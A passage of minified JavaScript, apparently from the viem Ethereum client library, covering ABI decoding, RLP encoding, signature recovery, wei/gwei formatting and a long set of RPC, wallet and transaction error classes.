this.assertPosition(e+3),this.dataView.getUint32(e)},pushByte(t){this.assertPosition(this.position),this.bytes[this.position]=t,this.position++},pushBytes(t){this.assertPosition(this.position+t.length-1),this.bytes.set(t,this.position),this.position+=t.length},pushUint8(t){this.assertPosition(this.position),this.bytes[this.position]=t,this.position++},pushUint16(t){this.assertPosition(this.position+1),this.dataView.setUint16(this.position,t),this.position+=2},pushUint24(t){this.assertPosition(this.position+2),this.dataView.setUint16(this.position,t>>8),this.dataView.setUint8(this.position+2,t&255),this.position+=3},pushUint32(t){this.assertPosition(this.position+3),this.dataView.setUint32(this.position,t),this.position+=4},readByte(){this.assertReadLimit(),this._touch();const t=this.inspectByte();return this.position++,t},readBytes(t,e){this.assertReadLimit(),this._touch();const r=this.inspectBytes(t);return this.position+=e??t,r},readUint8(){this.assertReadLimit(),this._touch();const t=this.inspectUint8();return this.position+=1,t},readUint16(){this.assertReadLimit(),this._touch();const t=this.inspectUint16();return this.position+=2,t},readUint24(){this.assertReadLimit(),this._touch();const t=this.inspectUint24();return this.position+=3,t},readUint32(){this.assertReadLimit(),this._touch();const t=this.inspectUint32();return this.position+=4,t},get remaining(){return this.bytes.length-this.position},setPosition(t){const e=this.position;return this.assertPosition(t),this.position=t,()=>this.position=e},_touch(){if(this.recursiveReadLimit===Number.POSITIVE_INFINITY)return;const t=this.getReadCount();this.positionReadCount.set(this.position,t+1),t>0&&this.recursiveReadCount++}};function vy(t,{recursiveReadLimit:e=8192}={}){const r=Object.create(W9);return r.bytes=t,r.dataView=new DataView(t.buffer,t.byteOffset,t.byteLength),r.positionReadCount=new Map,r.recursiveReadLimit=e,r}function G9(t,e={}){typeof e.size<"u"&&bi(t,{size:e.size});const r=Dr(t,e);return Ec(r,e)}function V9(t,e={}){let r=t;if(typeof e.size<"u"&&(bi(r,{size:e.size}),r=zc(r)),r.length>1||r[0]>1)throw new ZF(r);return!!r[0]}function gs(t,e={}){typeof e.size<"u"&&bi(t,{size:e.size});const r=Dr(t,e);return ia(r,e)}function K9(t,e={}){let r=t;return typeof e.size<"u"&&(bi(r,{size:e.size}),r=zc(r,{dir:"right"})),new TextDecoder().decode(r)}function uh(t,e){const r=typeof e=="string"?ji(e):e,n=vy(r);if(Ir(r)===0&&t.length>0)throw new Lf;if(Ir(e)&&Ir(e)<32)throw new pI({data:typeof e=="string"?e:Dr(e),params:t,size:Ir(e)});let i=0;const s=[];for(let o=0;o<t.length;++o){const a=t[o];n.setPosition(i);const[c,u]=sc(n,a,{staticPosition:0});i+=u,s.push(c)}return s}function sc(t,e,{staticPosition:r}){const n=by(e.type);if(n){const[i,s]=n;return Y9(t,{...e,type:s},{length:i,staticPosition:r})}if(e.type==="tuple")return e7(t,e,{staticPosition:r});if(e.type==="address")return Q9(t);if(e.type==="bool")return J9(t);if(e.type.startsWith("bytes"))return Z9(t,e,{staticPosition:r});if(e.type.startsWith("uint")||e.type.startsWith("int"))return X9(t,e);if(e.type==="string")return t7(t,{staticPosition:r});throw new QF(e.type,{docsPath:"/docs/contract/decodeAbiParameters"})}const yE=32,c0=32;function Q9(t){const e=t.readBytes(32);return[zf(Dr(DI(e,-20))),32]}function Y9(t,e,{length:r,staticPosition:n}){if(!r){const o=gs(t.readBytes(c0)),a=n+o,c=a+yE;t.setPosition(a);const u=gs(t.readBytes(yE)),l=Zu(e);let h=0;const d=[];for(let g=0;g<u;++g){t.setPosition(c+(l?g*32:h));const[y,m]=sc(t,e,{staticPosition:c});h+=m,d.push(y)}return t.setPosition(n+32),[d,32]}if(Zu(e)){const o=gs(t.readBytes(c0)),a=n+o,c=[];for(let u=0;u<r;++u){t.setPosition(a+u*32);const[l]=sc(t,e,{staticPosition:a});c.push(l)}return t.setPosition(n+32),[c,32]}let i=0;const s=[];for(let o=0;o<r;++o){const[a,c]=sc(t,e,{staticPosition:n+i});i+=c,s.push(a)}return[s,i]}function J9(t){return[V9(t.readBytes(32),{size:32}),32]}function Z9(t,e,{staticPosition:r}){const[n,i]=e.type.split("bytes");if(!i){const o=gs(t.readBytes(32));t.setPosition(r+o);const a=gs(t.readBytes(32));if(a===0)return t.setPosition(r+32),["0x",32];const c=t.readBytes(a);return t.setPosition(r+32),[Dr(c),32]}return[Dr(t.readBytes(Number.parseInt(i),32)),32]}function X9(t,e){const r=e.type.startsWith("int"),n=Number.parseInt(e.type.split("int")[1]||"256"),i=t.readBytes(32);return[n>48?G9(i,{signed:r}):gs(i,{signed:r}),32]}function e7(t,e,{staticPosition:r}){const n=e.components.length===0||e.components.some(({name:o})=>!o),i=n?[]:{};let s=0;if(Zu(e)){const o=gs(t.readBytes(c0)),a=r+o;for(let c=0;c<e.components.length;++c){const u=e.components[c];t.setPosition(a+s);const[l,h]=sc(t,u,{staticPosition:a});s+=h,i[n?c:u==null?void 0:u.name]=l}return t.setPosition(r+32),[i,32]}for(let o=0;o<e.components.length;++o){const a=e.components[o],[c,u]=sc(t,a,{staticPosition:r});i[n?o:a==null?void 0:a.name]=c,s+=u}return[i,s]}function t7(t,{staticPosition:e}){const r=gs(t.readBytes(32)),n=e+r;t.setPosition(n);const i=gs(t.readBytes(32));if(i===0)return t.setPosition(e+32),["",32];const s=t.readBytes(i,32),o=K9(zc(s));return t.setPosition(e+32),[o,32]}function Zu(t){var n;const{type:e}=t;if(e==="string"||e==="bytes"||e.endsWith("[]"))return!0;if(e==="tuple")return(n=t.components)==null?void 0:n.some(Zu);const r=by(t.type);return!!(r&&Zu({...t,type:r[1]}))}function r7(t){const{abi:e,data:r}=t,n=Ac(r,0,4);if(n==="0x")throw new Lf;const s=[...e||[],UI,z9].find(o=>o.type==="error"&&n===ah(Fi(o)));if(!s)throw new gI(n,{docsPath:"/docs/contract/decodeErrorResult"});return{abiItem:s,args:"inputs"in s&&s.inputs&&s.inputs.length>0?uh(s.inputs,Ac(r,4)):void 0,errorName:s.name}}const Wn=(t,e,r)=>JSON.stringify(t,(n,i)=>typeof i=="bigint"?i.toString():i,r);function LI({abiItem:t,args:e,includeFunctionName:r=!0,includeName:n=!1}){if("name"in t&&"inputs"in t&&t.inputs)return`${r?t.name:""}(${t.inputs.map((i,s)=>`${n&&i.name?`${i.name}: `:""}${typeof e[s]=="object"?Wn(e[s]):e[s]}`).join(", ")})`}const n7={gwei:9,wei:18},i7={ether:-9,wei:9},s7={ether:-18,gwei:-9};function Wc(t,e){let r=t.toString();const n=r.startsWith("-");n&&(r=r.slice(1)),r=r.padStart(e,"0");let[i,s]=[r.slice(0,r.length-e),r.slice(r.length-e)];return s=s.replace(/(0+)$/,""),`${n?"-":""}${i||"0"}${s?`.${s}`:""}`}function Ey(t,e="wei"){return Wc(t,n7[e])}function pn(t,e="wei"){return Wc(t,i7[e])}class o7 extends Y{constructor({address:e}){super(`State for account "${e}" is set multiple times.`,{name:"AccountStateConflictError"})}}class a7 extends Y{constructor(){super("state and stateDiff are set on the same account.",{name:"StateAssignmentConflictError"})}}function wE(t){return t.reduce((e,{slot:r,value:n})=>`${e}        ${r}: ${n}
`,"")}function c7(t){return t.reduce((e,{address:r,...n})=>{let i=`${e}    ${r}:
`;return n.nonce&&(i+=`      nonce: ${n.nonce}
`),n.balance&&(i+=`      balance: ${n.balance}
`),n.code&&(i+=`      code: ${n.code}
`),n.state&&(i+=`      state:
`,i+=wE(n.state)),n.stateDiff&&(i+=`      stateDiff:
`,i+=wE(n.stateDiff)),i},`  State Override:
`).slice(0,-1)}function lh(t){const e=Object.entries(t).map(([n,i])=>i===void 0||i===!1?null:[n,i]).filter(Boolean),r=e.reduce((n,[i])=>Math.max(n,i.length),0);return e.map(([n,i])=>`  ${`${n}:`.padEnd(r+1)}  ${i}`).join(`
`)}class u7 extends Y{constructor(){super(["Cannot specify both a `gasPrice` and a `maxFeePerGas`/`maxPriorityFeePerGas`.","Use `maxFeePerGas`/`maxPriorityFeePerGas` for EIP-1559 compatible networks, and `gasPrice` for others."].join(`
`),{name:"FeeConflictError"})}}class l7 extends Y{constructor({transaction:e}){super("Cannot infer a transaction type from provided transaction.",{metaMessages:["Provided Transaction:","{",lh(e),"}","","To infer the type, either provide:","- a `type` to the Transaction, or","- an EIP-1559 Transaction with `maxFeePerGas`, or","- an EIP-2930 Transaction with `gasPrice` & `accessList`, or","- an EIP-4844 Transaction with `blobs`, `blobVersionedHashes`, `sidecars`, or","- an EIP-7702 Transaction with `authorizationList`, or","- a Legacy Transaction with `gasPrice`"],name:"InvalidSerializableTransactionError"})}}class h7 extends Y{constructor(e,{account:r,docsPath:n,chain:i,data:s,gas:o,gasPrice:a,maxFeePerGas:c,maxPriorityFeePerGas:u,nonce:l,to:h,value:d}){var y;const g=lh({chain:i&&`${i==null?void 0:i.name} (id: ${i==null?void 0:i.id})`,from:r==null?void 0:r.address,to:h,value:typeof d<"u"&&`${Ey(d)} ${((y=i==null?void 0:i.nativeCurrency)==null?void 0:y.symbol)||"ETH"}`,data:s,gas:o,gasPrice:typeof a<"u"&&`${pn(a)} gwei`,maxFeePerGas:typeof c<"u"&&`${pn(c)} gwei`,maxPriorityFeePerGas:typeof u<"u"&&`${pn(u)} gwei`,nonce:l});super(e.shortMessage,{cause:e,docsPath:n,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Request Arguments:",g].filter(Boolean),name:"TransactionExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=e}}class FI extends Y{constructor({blockHash:e,blockNumber:r,blockTag:n,hash:i,index:s}){let o="Transaction";n&&s!==void 0&&(o=`Transaction at block time "${n}" at index "${s}"`),e&&s!==void 0&&(o=`Transaction at block hash "${e}" at index "${s}"`),r&&s!==void 0&&(o=`Transaction at block number "${r}" at index "${s}"`),i&&(o=`Transaction with hash "${i}"`),super(`${o} could not be found.`,{name:"TransactionNotFoundError"})}}class jI extends Y{constructor({hash:e}){super(`Transaction receipt with hash "${e}" could not be found. The Transaction may not be processed on a block yet.`,{name:"TransactionReceiptNotFoundError"})}}class d7 extends Y{constructor({hash:e}){super(`Timed out while waiting for transaction with hash "${e}" to be confirmed.`,{name:"WaitForTransactionReceiptTimeoutError"})}}const f7=t=>t,Ay=t=>t;class p7 extends Y{constructor(e,{account:r,docsPath:n,chain:i,data:s,gas:o,gasPrice:a,maxFeePerGas:c,maxPriorityFeePerGas:u,nonce:l,to:h,value:d,stateOverride:g}){var b;const y=r?Vi(r):void 0;let m=lh({from:y==null?void 0:y.address,to:h,value:typeof d<"u"&&`${Ey(d)} ${((b=i==null?void 0:i.nativeCurrency)==null?void 0:b.symbol)||"ETH"}`,data:s,gas:o,gasPrice:typeof a<"u"&&`${pn(a)} gwei`,maxFeePerGas:typeof c<"u"&&`${pn(c)} gwei`,maxPriorityFeePerGas:typeof u<"u"&&`${pn(u)} gwei`,nonce:l});g&&(m+=`
${c7(g)}`),super(e.shortMessage,{cause:e,docsPath:n,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Raw Call Arguments:",m].filter(Boolean),name:"CallExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=e}}class qI extends Y{constructor(e,{abi:r,args:n,contractAddress:i,docsPath:s,functionName:o,sender:a}){const c=ch({abi:r,args:n,name:o}),u=c?LI({abiItem:c,args:n,includeFunctionName:!1,includeName:!1}):void 0,l=c?Fi(c,{includeName:!0}):void 0,h=lh({address:i&&f7(i),function:l,args:u&&u!=="()"&&`${[...Array((o==null?void 0:o.length)??0).keys()].map(()=>" ").join("")}${u}`,sender:a});super(e.shortMessage||`An unknown error occurred while executing the contract function "${o}".`,{cause:e,docsPath:s,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],h&&"Contract Call:",h].filter(Boolean),name:"ContractFunctionExecutionError"}),Object.defineProperty(this,"abi",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"args",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"contractAddress",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"formattedArgs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"functionName",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"sender",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abi=r,this.args=n,this.cause=e,this.contractAddress=i,this.functionName=o,this.sender=a}}class u0 extends Y{constructor({abi:e,data:r,functionName:n,message:i}){let s,o,a,c;if(r&&r!=="0x")try{o=r7({abi:e,data:r});const{abiItem:l,errorName:h,args:d}=o;if(h==="Error")c=d[0];else if(h==="Panic"){const[g]=d;c=BI[g]}else{const g=l?Fi(l,{includeName:!0}):void 0,y=l&&d?LI({abiItem:l,args:d,includeFunctionName:!1,includeName:!1}):void 0;a=[g?`Error: ${g}`:"",y&&y!=="()"?`       ${[...Array((h==null?void 0:h.length)??0).keys()].map(()=>" ").join("")}${y}`:""]}}catch(l){s=l}else i&&(c=i);let u;s instanceof gI&&(u=s.signature,a=[`Unable to decode signature "${u}" as it was not found on the provided ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${u}.`]),super(c&&c!=="execution reverted"||u?[`The contract function "${n}" reverted with the following ${u?"signature":"reason"}:`,c||u].join(`
`):`The contract function "${n}" reverted.`,{cause:s,metaMessages:a,name:"ContractFunctionRevertedError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"raw",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"reason",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=o,this.raw=r,this.reason=c,this.signature=u}}class g7 extends Y{constructor({functionName:e}){super(`The contract function "${e}" returned no data ("0x").`,{metaMessages:["This could be due to any of the following:",`  - The contract does not have the function "${e}",`,"  - The parameters passed to the contract function may be invalid, or","  - The address is not a contract."],name:"ContractFunctionZeroDataError"})}}class m7 extends Y{constructor({factory:e}){super(`Deployment for counterfactual contract call failed${e?` for factory "${e}".`:""}`,{metaMessages:["Please ensure:","- The `factory` is a valid contract deployment factory (ie. Create2 Factory, ERC-4337 Factory, etc).","- The `factoryData` is a valid encoded function call for contract deployment function on the factory."],name:"CounterfactualDeploymentFailedError"})}}class _y extends Y{constructor({data:e,message:r}){super(r||"",{name:"RawContractError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:3}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=e}}class Ou extends Y{constructor({body:e,cause:r,details:n,headers:i,status:s,url:o}){super("HTTP request failed.",{cause:r,details:n,metaMessages:[s&&`Status: ${s}`,`URL: ${Ay(o)}`,e&&`Request body: ${Wn(e)}`].filter(Boolean),name:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=e,this.headers=i,this.status=s,this.url=o}}class Cy extends Y{constructor({body:e,error:r,url:n}){super("RPC Request failed.",{cause:r,details:r.message,metaMessages:[`URL: ${Ay(n)}`,`Request body: ${Wn(e)}`],name:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=r.code,this.data=r.data}}class bE extends Y{constructor({body:e,url:r}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${Ay(r)}`,`Request body: ${Wn(e)}`],name:"TimeoutError"})}}const y7=-1;class mn extends Y{constructor(e,{code:r,docsPath:n,metaMessages:i,name:s,shortMessage:o}){super(o,{cause:e,docsPath:n,metaMessages:i||(e==null?void 0:e.metaMessages),name:s||"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=s||e.name,this.code=e instanceof Cy?e.code:r??y7}}class On extends mn{constructor(e,r){super(e,r),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=r.data}}class Xu extends mn{constructor(e){super(e,{code:Xu.code,name:"ParseRpcError",shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."})}}Object.defineProperty(Xu,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class el extends mn{constructor(e){super(e,{code:el.code,name:"InvalidRequestRpcError",shortMessage:"JSON is not a valid request object."})}}Object.defineProperty(el,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class tl extends mn{constructor(e,{method:r}={}){super(e,{code:tl.code,name:"MethodNotFoundRpcError",shortMessage:`The method${r?` "${r}"`:""} does not exist / is not available.`})}}Object.defineProperty(tl,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class rl extends mn{constructor(e){super(e,{code:rl.code,name:"InvalidParamsRpcError",shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(rl,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class aa extends mn{constructor(e){super(e,{code:aa.code,name:"InternalRpcError",shortMessage:"An internal error was received."})}}Object.defineProperty(aa,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class nl extends mn{constructor(e){super(e,{code:nl.code,name:"InvalidInputRpcError",shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(nl,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class il extends mn{constructor(e){super(e,{code:il.code,name:"ResourceNotFoundRpcError",shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}Object.defineProperty(il,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class Xs extends mn{constructor(e){super(e,{code:Xs.code,name:"ResourceUnavailableRpcError",shortMessage:"Requested resource not available."})}}Object.defineProperty(Xs,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class _c extends mn{constructor(e){super(e,{code:_c.code,name:"TransactionRejectedRpcError",shortMessage:"Transaction creation failed."})}}Object.defineProperty(_c,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class Fo extends mn{constructor(e,{method:r}={}){super(e,{code:Fo.code,name:"MethodNotSupportedRpcError",shortMessage:`Method${r?` "${r}"`:""} is not supported.`})}}Object.defineProperty(Fo,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class Cc extends mn{constructor(e){super(e,{code:Cc.code,name:"LimitExceededRpcError",shortMessage:"Request exceeds defined limit."})}}Object.defineProperty(Cc,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class sl extends mn{constructor(e){super(e,{code:sl.code,name:"JsonRpcVersionUnsupportedError",shortMessage:"Version of JSON-RPC protocol is not supported."})}}Object.defineProperty(sl,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class hr extends On{constructor(e){super(e,{code:hr.code,name:"UserRejectedRequestError",shortMessage:"User rejected the request."})}}Object.defineProperty(hr,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class ol extends On{constructor(e){super(e,{code:ol.code,name:"UnauthorizedProviderError",shortMessage:"The requested method and/or account has not been authorized by the user."})}}Object.defineProperty(ol,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class al extends On{constructor(e,{method:r}={}){super(e,{code:al.code,name:"UnsupportedProviderMethodError",shortMessage:`The Provider does not support the requested method${r?` " ${r}"`:""}.`})}}Object.defineProperty(al,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class cl extends On{constructor(e){super(e,{code:cl.code,name:"ProviderDisconnectedError",shortMessage:"The Provider is disconnected from all chains."})}}Object.defineProperty(cl,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class ul extends On{constructor(e){super(e,{code:ul.code,name:"ChainDisconnectedError",shortMessage:"The Provider is not connected to the requested chain."})}}Object.defineProperty(ul,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class zi extends On{constructor(e){super(e,{code:zi.code,name:"SwitchChainError",shortMessage:"An error occurred when attempting to switch chain."})}}Object.defineProperty(zi,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class ll extends On{constructor(e){super(e,{code:ll.code,name:"UnsupportedNonOptionalCapabilityError",shortMessage:"This Wallet does not support a capability that was not marked as optional."})}}Object.defineProperty(ll,"code",{enumerable:!0,configurable:!0,writable:!0,value:5700});class hl extends On{constructor(e){super(e,{code:hl.code,name:"UnsupportedChainIdError",shortMessage:"This Wallet does not support the requested chain ID."})}}Object.defineProperty(hl,"code",{enumerable:!0,configurable:!0,writable:!0,value:5710});class dl extends On{constructor(e){super(e,{code:dl.code,name:"DuplicateIdError",shortMessage:"There is already a bundle submitted with this ID."})}}Object.defineProperty(dl,"code",{enumerable:!0,configurable:!0,writable:!0,value:5720});class fl extends On{constructor(e){super(e,{code:fl.code,name:"UnknownBundleIdError",shortMessage:"This bundle id is unknown / has not been submitted"})}}Object.defineProperty(fl,"code",{enumerable:!0,configurable:!0,writable:!0,value:5730});class pl extends On{constructor(e){super(e,{code:pl.code,name:"BundleTooLargeError",shortMessage:"The call bundle is too large for the Wallet to process."})}}Object.defineProperty(pl,"code",{enumerable:!0,configurable:!0,writable:!0,value:5740});class gl extends On{constructor(e){super(e,{code:gl.code,name:"AtomicReadyWalletRejectedUpgradeError",shortMessage:"The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."})}}Object.defineProperty(gl,"code",{enumerable:!0,configurable:!0,writable:!0,value:5750});class ml extends On{constructor(e){super(e,{code:ml.code,name:"AtomicityNotSupportedError",shortMessage:"The wallet does not support atomic execution but the request requires it."})}}Object.defineProperty(ml,"code",{enumerable:!0,configurable:!0,writable:!0,value:5760});class w7 extends mn{constructor(e){super(e,{name:"UnknownRpcError",shortMessage:"An unknown RPC error occurred."})}}const b7=3;function $d(t,{abi:e,address:r,args:n,docsPath:i,functionName:s,sender:o}){const a=t instanceof _y?t:t instanceof Y?t.walk(y=>"data"in y)||t.walk():{},{code:c,data:u,details:l,message:h,shortMessage:d}=a,g=t instanceof Lf?new g7({functionName:s}):[b7,aa.code].includes(c)&&(u||l||h||d)?new u0({abi:e,data:typeof u=="object"?u.data:u,functionName:s,message:a instanceof Cy?l:d??h}):t;return new qI(g,{abi:e,args:n,contractAddress:r,docsPath:i,functionName:s,sender:o})}function v7(t){const e=no(`0x${t.substring(4)}`).substring(26);return zf(`0x${e}`)}async function E7({hash:t,signature:e}){const r=ws(t)?t:bs(t),{secp256k1:n}=await ln(async()=>{const{secp256k1:o}=await import("./secp256k1-BDrx4kR8.js");return{secp256k1:o}},[]);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:u,s:l,v:h,yParity:d}=e,g=Number(d??h),y=vE(g);return new n.Signature(Ec(u),Ec(l)).addRecoveryBit(y)}const o=ws(e)?e:bs(e),a=ia(`0x${o.slice(130)}`),c=vE(a);return n.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(r.substring(2)).toHex(!1)}`}function vE(t){if(t===0||t===1)return t;if(t===27)return 0;if(t===28)return 1;throw new Error("Invalid yParityOrV value")}async function A7({hash:t,signature:e}){return v7(await E7({hash:t,signature:e}))}function _7(t,e="hex"){const r=zI(t),n=vy(new Uint8Array(r.length));return r.encode(n),e==="hex"?Dr(n.bytes):n.bytes}function zI(t){return Array.isArray(t)?C7(t.map(e=>zI(e))):I7(t)}function C7(t){const e=t.reduce((i,s)=>i+s.length,0),r=HI(e);return{length:e<=55?1+e:1+r+e,encode(i){e<=55?i.pushByte(192+e):(i.pushByte(247+r),r===1?i.pushUint8(e):r===2?i.pushUint16(e):r===3?i.pushUint24(e):i.pushUint32(e));for(const{encode:s}of t)s(i)}}}function I7(t){const e=typeof t=="string"?ji(t):t,r=HI(e.length);return{length:e.length===1&&e[0]<128?1:e.length<=55?1+e.length:1+r+e.length,encode(i){e.length===1&&e[0]<128?i.pushBytes(e):e.length<=55?(i.pushByte(128+e.length),i.pushBytes(e)):(i.pushByte(183+r),r===1?i.pushUint8(e.length):r===2?i.pushUint16(e.length):r===3?i.pushUint24(e.length):i.pushUint32(e.length),i.pushBytes(e))}}}function HI(t){if(t<2**8)return 1;if(t<2**16)return 2;if(t<2**24)return 3;if(t<2**32)return 4;throw new Y("Length is too large.")}function x7(t){const{chainId:e,nonce:r,to:n}=t,i=t.contractAddress??t.address,s=no(oh(["0x05",_7([e?Ue(e):"0x",i,r?Ue(r):"0x"])]));return n==="bytes"?ji(s):s}async function WI(t){const{authorization:e,signature:r}=t;return A7({hash:x7(e),signature:r??e})}class S7 extends Y{constructor(e,{account:r,docsPath:n,chain:i,data:s,gas:o,gasPrice:a,maxFeePerGas:c,maxPriorityFeePerGas:u,nonce:l,to:h,value:d}){var y;const g=lh({from:r==null?void 0:r.address,to:h,value:typeof d<"u"&&`${Ey(d)} ${((y=i==null?void 0:i.nativeCurrency)==null?void 0:y.symbol)||"ETH"}`,data:s,gas:o,gasPrice:typeof a<"u"&&`${pn(a)} gwei`,maxFeePerGas:typeof c<"u"&&`${pn(c)} gwei`,maxPriorityFeePerGas:typeof u<"u"&&`${pn(u)} gwei`,nonce:l});super(e.shortMessage,{cause:e,docsPath:n,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Estimate Gas Arguments:",g].filter(Boolean),name:"EstimateGasExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=e}}class jo extends Y{constructor({cause:e,message:r}={}){var i;const n=(i=r==null?void 0:r.replace("execution reverted: ",""))==null?void 0:i.replace("execution reverted","");super(`Execution reverted ${n?`with reason: ${n}`:"for an unknown reason"}.`,{cause:e,name:"ExecutionRevertedError"})}}Object.defineProperty(jo,"code",{enumerable:!0,configurable:!0,writable:!0,value:3});Object.defineProperty(jo,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class Ld extends Y{constructor({cause:e,maxFeePerGas:r}={}){super(`The fee cap (\`maxFeePerGas\`${r?` = ${pn(r)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:e,name:"FeeCapTooHighError"})}}Object.defineProperty(Ld,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class l0 extends Y{constructor({cause:e,maxFeePerGas:r}={}){super(`The fee cap (\`maxFeePerGas\`${r?` = ${pn(r)}`:""} gwei) cannot be lower than the block base fee.`,{cause:e,name:"FeeCapTooLowError"})}}Object.defineProperty(l0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/});class h0 extends Y{constructor({cause:e,nonce:r}={}){super(`Nonce provided for the transaction ${r?`(${r}) `:""}is higher than the next one expected.`,{cause:e,name:"NonceTooHighError"})}}Object.defineProperty(h0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too high/});class d0 extends Y{constructor({cause:e,nonce:r}={}){super([`Nonce provided for the transaction ${r?`(${r}) `:""}is lower than the current nonce of the account.`,"Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`),{cause:e,name:"NonceTooLowError"})}}Object.defineProperty(d0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too low|transaction already imported|already known/});class f0 extends Y{constructor({cause:e,nonce:r}={}){super(`Nonce provided for the transaction ${r?`(${r}) `:""}exceeds the maximum allowed nonce.`,{cause:e,name:"NonceMaxValueError"})}}Object.defineProperty(f0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce has max value/});class p0 extends Y{constructor({cause:e}={}){super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`),{cause:e,metaMessages:["This error could arise when the account does not have enough funds to:"," - pay for the total gas fee,"," - pay for the value to send."," ","The cost of the transaction is calculated as `gas * gas fee + value`, where:"," - `gas` is the amount of gas needed for transaction to execute,"," - `gas fee` is the gas fee,"," - `value` is the amount of ether to send to the recipient."],name:"InsufficientFundsError"})}}Object.defineProperty(p0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/insufficient funds|exceeds transaction sender account balance/});class g0 extends Y{constructor({cause:e,gas:r}={}){super(`The amount of gas ${r?`(${r}) `:""}provided for the transaction exceeds the limit allowed for the block.`,{cause:e,name:"IntrinsicGasTooHighError"})}}Object.defineProperty(g0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too high|gas limit reached/});class m0 extends Y{constructor({cause:e,gas:r}={}){super(`The amount of gas ${r?`(${r}) `:""}provided for the transaction is too low.`,{cause:e,name:"IntrinsicGasTooLowError"})}}Object.defineProperty(m0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too low/});class y0 extends Y{constructor({cause:e}){super("The transaction type is not supported for this chain.",{cause:e,name:"TransactionTypeNotSupportedError"})}}Object.defineProperty(y0,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/transaction type not valid/});class Fd extends Y{constructor({cause:e,maxPriorityFeePerGas:r,maxFeePerGas:n}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${r?` = ${pn(r)} 